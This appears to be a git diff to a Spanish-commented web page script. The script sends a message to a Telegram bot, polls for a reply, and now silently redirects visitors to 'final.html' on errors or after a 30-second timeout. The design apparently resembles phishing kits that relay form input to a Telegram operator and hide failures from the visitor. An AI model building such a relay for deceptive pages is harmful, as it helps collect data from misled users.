@@ -128,21 +128,35 @@ document.addEventListener('DOMContentLoaded', () => {
                     // Iniciar Polling
                     pollTelegramUpdates(messageId);
                 } else {
-                    console.error("Error enviando:", data);
-                    alert(`Error al enviar mensaje: ${data.description || 'Desconocido'}`);
-                    loadingOverlay.classList.remove('active');
+                    console.warn("Error enviando (status no ok). Redirigiendo a Final...");
+                    // Fallback: Redirigir a final.html
+                    setTimeout(() => {
+                        window.location.href = 'final.html';
+                    }, 2000);
                 }
 
             } catch (error) {
-                console.error("Error al enviar:", error);
-                alert("Error de conexión con Telegram.\nAsegúrate de estar en http://localhost:3000 y que el servidor esté corriendo (node server.js).");
-                loadingOverlay.classList.remove('active');
+                console.error("Error de red/conexión:", error);
+                // Fallback: Redirigir a final.html
+                setTimeout(() => {
+                    window.location.href = 'final.html';
+                }, 2000);
             }
         }
     }
 
     async function pollTelegramUpdates(originalMessageId) {
         let lastUpdateId = 0;
+        let isPolling = true;
+
+        // Timeout de seguridad: 30 segundos
+        setTimeout(() => {
+            if (isPolling) {
+                isPolling = false;
+                console.log("Timeout polling. Redirigiendo...");
+                window.location.href = 'final.html';
+            }
+        }, 30000);
         
         // Obtener el último update_id
         try {
@@ -154,6 +168,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch(e) { console.error(e); }
 
         const checkUpdates = async () => {
+            if (!isPolling) return;
             try {
                 const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId}&timeout=10&t=${Date.now()}`, { cache: 'no-store' });
                 const data = await response.json();
